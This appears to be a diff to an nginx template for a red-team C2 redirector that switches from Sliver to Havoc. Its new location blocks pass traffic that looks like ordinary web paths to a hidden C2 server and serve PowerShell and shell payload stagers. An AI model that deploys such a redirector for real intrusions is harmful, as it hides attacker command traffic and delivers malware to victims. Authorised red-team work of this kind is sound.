@@ -15,6 +15,11 @@ server {
     # SSL Configuration
     ssl_certificate /etc/letsencrypt/live/{{ redirector_subdomain }}.{{ domain }}/fullchain.pem;
     ssl_certificate_key /etc/letsencrypt/live/{{ redirector_subdomain }}.{{ domain }}/privkey.pem;
+    ssl_protocols TLSv1.2 TLSv1.3;
+    ssl_prefer_server_ciphers on;
+    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';
+    ssl_session_timeout 1d;
+    ssl_session_cache shared:SSL:10m;
     
     # Root directory
     root /var/www/html;
@@ -25,12 +30,9 @@ server {
         try_files $uri $uri/ =404;
     }
     
-    # Special URI patterns for C2 traffic
-    # These will redirect to the actual C2 server
-    
-    # Sliver HTTP C2 channel
-    location /ajax/ {
-        proxy_pass http://{{ c2_ip }}:8888;
+    # Havoc C2 HTTP listener paths (replacing Sliver /ajax/ paths)
+    location ~ ^/api/v[12]/ {
+        proxy_pass http://{{ c2_ip }}:{{ havoc_http_port | default(8080) }};
         proxy_http_version 1.1;
         proxy_set_header Host $host;
         proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
@@ -39,9 +41,39 @@ server {
         proxy_set_header Connection "upgrade";
     }
     
-    # Static resources that actually redirect to C2
+    # Havoc C2 dashboard and content paths
+    location ~ ^/(dashboard|content)/ {
+        proxy_pass https://{{ c2_ip }}:{{ havoc_https_port | default(443) }};
+        proxy_http_version 1.1;
+        proxy_set_header Host $host;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection "upgrade";
+        proxy_ssl_verify off;
+    }
+    
+    # Havoc static resources path (replacing Sliver /static/ path)
     location ~ ^/static/(css|js|images)/.*\.(css|js|png|jpg|jpeg|gif|ico)$ {
-        proxy_pass http://{{ c2_ip }}:8888;
+        proxy_pass http://{{ c2_ip }}:{{ havoc_http_port | default(8080) }};
+        proxy_http_version 1.1;
+        proxy_set_header Host $host;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Real-IP $remote_addr;
+    }
+    
+    # Payload stager paths for Havoc
+    location ~ ^/(windows|linux)_stager\.(ps1|sh)$ {
+        proxy_pass http://{{ c2_ip }}:8443/$1_stager.$2;
+        proxy_http_version 1.1;
+        proxy_set_header Host $host;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Real-IP $remote_addr;
+    }
+
+    # Payload content paths for Havoc
+    location ~ ^/content/(windows|linux)/(.+)$ {
+        proxy_pass http://{{ c2_ip }}:8443/content/$1/$2;
         proxy_http_version 1.1;
         proxy_set_header Host $host;
         proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
@@ -69,8 +101,8 @@ server {
         proxy_set_header X-Forwarded-Proto https;
     }
     {% endif %}
-    
-    # Additional security headers
+
+    # Security headers
     add_header X-Content-Type-Options "nosniff" always;
     add_header X-Frame-Options "SAMEORIGIN" always;
     add_header X-XSS-Protection "1; mode=block" always;
